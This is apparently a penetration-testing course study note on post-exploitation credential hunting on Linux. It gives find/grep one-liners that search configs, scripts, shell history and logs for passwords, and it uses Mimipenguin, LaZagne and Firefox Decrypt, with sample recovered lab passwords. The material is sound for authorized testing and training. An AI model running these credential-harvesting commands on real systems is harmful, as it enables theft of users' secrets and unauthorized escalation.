# 🐧 1. Credential Hunting in Linux

> [!info]  
> **Credential hunting** should be one of the first activities after gaining access to a Linux system.
> 
> Credentials found on a compromised host can provide:
> 
> - 🔓 Access to other services
>     
> - 👤 Access as another user
>     
> - ⬆️ Local privilege escalation
>     
> - 🌐 Lateral movement
>     
> - 🔑 Access to applications and databases
>     
> 
> A common scenario is gaining a **reverse shell through a vulnerable web application** and then searching the system for credentials that can help us escalate privileges.

---

# 🧠 2. The Four Credential Sources

A useful way to organize Linux credential hunting is into **four major categories**:

```text
                 🔎 CREDENTIAL HUNTING
                         │
       ┌─────────────────┼─────────────────┐
       ↓                 ↓                 ↓
   📁 FILES          📜 HISTORY         🧠 MEMORY
       │                 │                 │
 configs              logs              cache
 databases            commands          processes
 notes
 scripts
 cronjobs
 SSH keys
                         │
                         ↓
                    🔐 KEY-RINGS
                         │
                  Browser credentials
```

|Category|Examples|
|---|---|
|**Files**|Configs, databases, notes, scripts, cronjobs, SSH keys|
|**History**|Logs and command-line history|
|**Memory**|Cache and in-memory processing|
|**Key-rings**|Browser-stored credentials|

> [!important]  
> **Don't hunt blindly.** Always consider the system's purpose, role, applications, and place in the network. A database server, web server, workstation, and development server can expose very different credentials.

---

# 📁 3. Credential Hunting in Files

Linux follows the principle:

> **"Everything is a file."**

This makes files one of the most important places to search.

The main categories to investigate are:

```text
📁 Configuration files
🗄️ Databases
📝 Notes
📜 Scripts
⏰ Cronjobs
🔑 SSH keys
```

These can contain credentials directly or reveal how services authenticate.

---

# ⚙️ 4. Configuration Files

Configuration files are central to how Linux services operate.

They can contain:

- Usernames
    
- Passwords
    
- Database credentials
    
- API keys
    
- Connection strings
    
- Service configuration
    
- Authentication requirements
    

Common configuration extensions include:

```text
.config
.conf
.cnf
```

However:

> [!warning]  
> **Do not rely exclusively on file extensions.**
> 
> Configuration files can be renamed, have no extension, or use custom filenames. Even when software is recompiled, its expected configuration filename can sometimes be changed.

---

# 🔎 5. Searching for Configuration Files

A useful first step is to enumerate configuration files across the filesystem.

```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

### 🧠 What It Does

```text
.conf
.config
.cnf
   │
   ↓
find /
   │
   ↓
Search filesystem
   │
   ↓
Suppress errors
   │
   ↓
Remove common irrelevant directories
   │
   ↓
Review configuration files
```

Example results include:

```text
File extension:  .conf
/etc/ltrace.conf
/etc/rygel.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/fprintd.conf

File extension:  .config
/home/cry0l1t3/.config
/etc/X11/Xwrapper.config
/etc/manpath.config

File extension:  .cnf
/etc/mysql/my.cnf
/etc/mysql/debian.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/mysql/mysql.cnf
```

> [!tip]  
> Saving the results to a file can make it easier to investigate each configuration file individually.

---

# 🔍 6. Search Configuration Files for Credentials

Once configuration files are identified, search their contents for common credential-related keywords.

Example:

```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

The search looks for:

```text
user
password
pass
```

and ignores lines containing:

```text
#
```

which commonly represent comments.

Example output:

```text
File:  /etc/ssl/openssl.cnf
challengePassword = A challenge password

File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user = mysql
```

> [!important]  
> A keyword match does **not automatically mean you found a credential**. Investigate the surrounding configuration and determine whether the value is actually used for authentication.

---

# 🗄️ 7. Searching for Databases

Databases can contain credentials directly or contain application data that leads to credentials.

Search for common database-related extensions:

```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

Potential results include:

```text
.db
├── Firefox cert9.db
├── Firefox key4.db
├── Application databases
└── Other SQLite/database files
```

Example:

```text
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db
```

> [!tip]  
> **Don't assume `.db` means "unimportant."** Browser profiles and application databases can contain authentication-related information.

---

# 📝 8. Searching for Notes

Administrators and developers often create notes documenting:

- Systems
    
- Credentials
    
- Processes
    
- Access points
    
- Commands
    
- Services
    

The problem is that notes can have **arbitrary filenames and extensions**.

Therefore, searching only for `.txt` is insufficient.

A useful search is:

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

This searches for:

```text
*.txt
+
Files with no extension
```

Example results:

```text
/home/cry0l1t3/.config/caja/desktop-metadata
/home/cry0l1t3/.config/clipit/clipitrc
/home/cry0l1t3/.config/dconf/user
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt
```

> [!important]  
> **Notes can be named anything.** During credential hunting, filenames alone should not determine whether a file is worth investigating.

---

# 📜 9. Searching for Scripts

Scripts are high-value credential targets because automation often requires credentials.

For example:

```text
Administrator
     │
     ├── manually enters password every time
     │
     └── ❌ inefficient
```

Instead, an administrator may automate the task:

```text
Script
  │
  ├── username
  ├── password
  └── automated command
```

This means scripts can accidentally contain:

- Passwords
    
- API keys
    
- Database credentials
    
- SSH credentials
    
- Service accounts
    

Search common scripting extensions:

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

### 📚 Extensions

```text
.py   → Python
.pyc  → Compiled Python
.pl   → Perl
.go   → Go
.jar  → Java archive
.c    → C source
.sh   → Shell script
```

> [!tip]  
> After finding interesting scripts, inspect them for hardcoded credentials, connection strings, environment variables, and commands involving authentication.

---

# ⏰ 10. Enumerating Cronjobs

**Cron** automatically executes commands, programs, and scripts according to a schedule.

Cronjobs are particularly interesting because:

1. They may execute with elevated privileges.
    
2. They may call scripts.
    
3. Scripts may contain credentials.
    
4. Credentials may be passed directly in commands.
    

### 📍 Important Locations

System-wide cron configuration:

```text
/etc/crontab
```

Cron directories:

```text
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/etc/cron.monthly/
/etc/cron.weekly/
```

---

# 🔎 11. Inspecting `/etc/crontab`

```bash
cat /etc/crontab
```

Example:

```text
# /etc/crontab: system-wide crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```

### 🧩 Cron Format

```text
*  *  *  *  *  user  command
│  │  │  │  │    │       │
│  │  │  │  │    │       └─ Command
│  │  │  │  │    └─ User executing it
│  │  │  │  └─ Day of week
│  │  │  └─ Month
│  │  └─ Day of month
│  └─ Hour
└─ Minute
```

> [!important]  
> `/etc/crontab` and files in `/etc/cron.d/` include a **username field**, unlike user crontabs.

---

# 📂 12. Enumerating Cron Directories

```bash
ls -la /etc/cron.*/
```

This can reveal jobs in directories such as:

```text
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/etc/cron.monthly/
/etc/cron.weekly/
```

Example:

```text
/etc/cron.d/
├── e2scrub_all
├── geoipupdate
├── john
├── mdadm
├── php
└── sysstat
```

> [!warning]  
> Don't only inspect the cron configuration itself. **Follow the command/script being executed.** The real credential or privilege-escalation opportunity may exist inside the referenced script.

---

# 📜 13. Enumerating History Files

History files can reveal both **past activity** and potentially sensitive credentials.

Important Bash files include:

```text
~/.bash_history
~/.bashrc
~/.bash_profile
```

### 🔎 Search Example

```bash
tail -n5 /home/*/.bash*
```

Example:

```text
==> /home/cry0l1t3/.bash_history <==
vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK
```

The final line is particularly interesting:

```text
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK
```

It demonstrates why shell history can be valuable: users sometimes accidentally place **credentials directly on the command line**, causing them to be recorded in history.

> [!important]  
> Always inspect command history for:
> 
> - Passwords
>     
> - API keys
>     
> - Tokens
>     
> - SSH commands
>     
> - `su` / `sudo`
>     
> - Database commands
>     
> - Scripts receiving credentials as arguments
>     

---

# 📝 14. Log Files

Linux systems and applications generate many logs.

Logs can reveal:

- Authentication activity
    
- Successful logins
    
- Failed logins
    
- SSH activity
    
- `sudo` usage
    
- Account creation/deletion
    
- Password changes
    
- Service activity
    

The source divides logs into four categories:

```text
📱 Application logs
⚡ Event logs
⚙️ Service logs
🖥️ System logs
```

---

# 📊 15. Important Linux Log Files

|**FileDescription**||
|---|---|
|`/var/log/messages`|Generic system activity logs.|
|`/var/log/syslog`|Generic system activity logs.|
|`/var/log/auth.log`|(Debian) All authentication related logs.|
|`/var/log/secure`|(RedHat/CentOS) All authentication related logs.|
|`/var/log/boot.log`|Booting information.|
|`/var/log/dmesg`|Hardware and drivers related information and logs.|
|`/var/log/kern.log`|Kernel related warnings, errors and logs.|
|`/var/log/faillog`|Failed login attempts.|
|`/var/log/cron`|Information related to cron jobs.|
|`/var/log/mail.log`|All mail server related logs.|
|`/var/log/httpd`|All Apache related logs.|
|`/var/log/mysqld.log`|All MySQL server related logs.|

---

# 🔎 16. Searching Logs for Interesting Events

Useful strings include:

```text
accepted
session opened
session closed
failure
failed
ssh
password changed
new user
delete user
sudo
COMMAND=
logs
```

The source provides this automated search:

```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

> [!tip]  
> Start by understanding the format and purpose of individual logs before automating large searches. This makes it easier to distinguish useful authentication information from ordinary system noise.

---

# 🧠 17. Memory and Cache

Credentials are not always stored permanently on disk.

Applications and processes may keep authentication material in:

```text
🧠 Memory
💾 Cache
🔐 Application credential stores
```

This creates another credential-hunting category.

---

# 🐧 18. Mimipenguin

[Mimipenguin GitHub repository](https://github.com/huntergregal/mimipenguin?utm_source=chatgpt.com)

**Mimipenguin** is designed to retrieve credentials from Linux systems by examining information available in memory and related locations.

It requires:

> **Administrator/root privileges**

Example:

```bash
sudo python3 mimipenguin.py
```

Example result:

```text
[SYSTEM - GNOME]    cry0l1t3:WLpAEXFa0SbqOHY
```

This reveals:

```text
Username → cry0l1t3
Password → WLpAEXFa0SbqOHY
```

> [!important]  
> This demonstrates why **memory must be considered during credential hunting**. A password may not exist in plaintext anywhere obvious on disk but may temporarily exist in memory while an application is using it.

---

# 🧰 19. LaZagne on Linux

LaZagne can also be used on Linux and can access a broader collection of credential sources.

Potential sources include:

```text
📶 WiFi
📡 Wpa_supplicant
🔐 Libsecret
🔑 KWallet
🌐 Chromium-based browsers
💻 CLI
🦊 Mozilla
📧 Thunderbird
📦 Git
🌱 Environment variables
⚙️ GRUB
💾 Fstab
☁️ AWS
📁 FileZilla
📁 GFTP
🔑 SSH
🌐 Apache
🔐 Shadow
🐳 Docker
🔒 KeePass
🧠 Mimipy
🖥️ Sessions
🔐 Keyrings
```

Example:

```bash
sudo python2.7 laZagne.py all
```

---

# 🔐 20. Linux Keyrings

**Keyrings** provide secure storage and management of passwords on Linux systems.

The basic concept:

```text
                 🔐 KEYRING
                    │
             ┌──────┴──────┐
             ↓             ↓
        Stored secrets   Passwords
             │
             ↓
        🔒 Encrypted
             │
             ↓
       Protected by a
        master password
```

This functions similarly to an OS-level password manager.

> [!important]  
> Keyrings are another example of credentials being stored securely but still potentially becoming valuable during a credential-hunting operation if the necessary access/decryption context is available.

---

# 🌐 21. Browser Credentials on Linux

Browsers commonly store saved credentials **locally in encrypted form**.

For Firefox, credentials can be stored inside the user's hidden Mozilla profile directory.

Find Firefox profiles with:

```bash
ls -l .mozilla/firefox/ | grep default
```

Example:

```text
drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```

---

# 🗄️ 22. Firefox `logins.json`

Firefox stores saved login information in:

```text
logins.json
```

Example:

```bash
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

The file can reveal information such as:

```text
hostname
usernameField
passwordField
encryptedUsername
encryptedPassword
timeCreated
timeLastUsed
timePasswordChanged
```

Example:

```json
{
  "logins": [
    {
      "hostname": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...",
      "encryptedPassword": "MEIEEPgAAAA...SNIP..."
    }
  ]
}
```

> [!warning]  
> The username and password values are encrypted. Simply reading `logins.json` does **not** give you the plaintext password.

---

# 🔓 23. Firefox Decrypt

[Firefox Decrypt GitHub repository](https://github.com/unode/firefox_decrypt?utm_source=chatgpt.com)

**Firefox Decrypt** can decrypt credentials stored in Firefox profiles.

The source notes that the current version requires **Python 3.9**, while older `Firefox Decrypt 0.7.0` can be used with Python 2.

Example:

```bash
python3.9 firefox_decrypt.py
```

The tool asks which Mozilla profile to decrypt:

```text
Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2
```

Example recovered credentials:

```text
Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
```

---

# 🧰 24. LaZagne Browser Module

Instead of using Firefox Decrypt separately, LaZagne can also search supported browsers.

Example:

```bash
python3 laZagne.py browsers
```

Example:

```text
------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test

[+] Password found !!!
URL: https://www.inlanefreight.com
Login: cry0l1t3
Password: FzXUxJemKm6g2lGh

[+] 2 passwords have been found.
```

> [!tip]  
> `browsers` is useful when you specifically want browser credentials instead of running every LaZagne module.

---

# 🧭 25. Complete Linux Credential-Hunting Workflow

```text
                 🐧 LINUX ACCESS
                       │
                       ↓
              🧠 IDENTIFY THE HOST
                       │
             What is this machine?
                       │
        ┌──────────────┼──────────────┐
        ↓              ↓              ↓
     Web Server    DB Server      Workstation
        │              │              │
        └──────────────┼──────────────┘
                       ↓
                 📁 SEARCH FILES
                       │
       ┌───────────────┼────────────────┐
       ↓               ↓                ↓
   ⚙️ Configs       🗄️ DBs          📜 Scripts
       │               │                │
       └───────────────┼────────────────┘
                       ↓
                 ⏰ CRONJOBS
                       │
                       ↓
                 📜 HISTORY
                       │
                       ↓
                  📝 LOGS
                       │
                       ↓
              🧠 MEMORY / CACHE
                       │
              ┌────────┴────────┐
              ↓                 ↓
        🐧 Mimipenguin       🧰 LaZagne
              │                 │
              └────────┬────────┘
                       ↓
                🔐 KEYRINGS
                       │
                       ↓
              🌐 BROWSER CREDS
                       │
                       ↓
                 💎 CREDENTIAL
                       │
                       ↓
          🔓 PRIVESC / LATERAL
                MOVEMENT
```

---

# 🎯 26. CPTS Credential-Hunting Priorities

When you first obtain a Linux shell, think in this order:

```text
1️⃣ 👤 Who am I?
       ↓
2️⃣ 🖥️ What is this machine used for?
       ↓
3️⃣ 📁 What files contain secrets?
       ↓
4️⃣ 📜 What commands have users executed?
       ↓
5️⃣ ⏰ What runs automatically?
       ↓
6️⃣ 📝 What does the system log?
       ↓
7️⃣ 🧠 What credentials exist in memory?
       ↓
8️⃣ 🔐 What credentials exist in keyrings/browsers?
       ↓
9️⃣ 💎 Can any discovered credential give me more access?
```

---

# ⚡ 27. Linux Credential-Hunting Cheat Sheet

### 📁 Configuration Files

```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

### 🔍 Search `.cnf` for Credential Keywords

```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### 🗄️ Database Files

```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

### 📝 Notes

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### 📜 Scripts

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

### ⏰ Cron

```bash
cat /etc/crontab
```

```bash
ls -la /etc/cron.*/
```

### 📜 Bash History

```bash
tail -n5 /home/*/.bash*
```

### 📝 Logs

```bash
ls /var/log/
```

### 🧠 Mimipenguin

```bash
sudo python3 mimipenguin.py
```

### 🧰 LaZagne

```bash
sudo python2.7 laZagne.py all
```

### 🌐 Firefox Profiles

```bash
ls -l .mozilla/firefox/ | grep default
```

### 🗄️ Firefox Credential Database

```bash
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

### 🔓 Firefox Decrypt

```bash
python3.9 firefox_decrypt.py
```

### 🌐 LaZagne Browser Module

```bash
python3 laZagne.py browsers
```

---

# 🧠 28. The Big Picture

> [!important]  
> **Credential hunting is an enumeration mindset, not a single command.**
> 
> The key is to systematically investigate where credentials could exist based on how the Linux system is used.

```text
              🐧 COMPROMISED LINUX HOST
                         │
          ┌──────────────┼──────────────┐
          ↓              ↓              ↓
        📁 Files       📜 History     🧠 Memory
          │              │              │
     ┌────┼────┐      ┌──┴──┐       ┌───┴────┐
     ↓    ↓    ↓      ↓     ↓       ↓        ↓
  Config DB  Scripts  Bash  Logs  Cache   Processes
     │    │    │
     └────┴────┘
          │
          ↓
     🔐 Keyrings
          │
          ↓
     🌐 Browsers
          │
          ↓
    💎 CREDENTIALS
          │
          ↓
  🔓 MORE ACCESS / PRIVESC
```

> [!success]  
> **CPTS Key Takeaway:**
> 
> After gaining Linux access, immediately think:
> 
> **Files → History → Memory → Keyrings**
> 
> Then break **Files** down into:
> 
> **Configs → Databases → Notes → Scripts → Cronjobs → SSH keys**
> 
> The objective is not simply to "find passwords." The objective is to understand **where authentication material exists on the host**, recover it when possible, and determine whether it can lead to **privilege escalation or additional access**.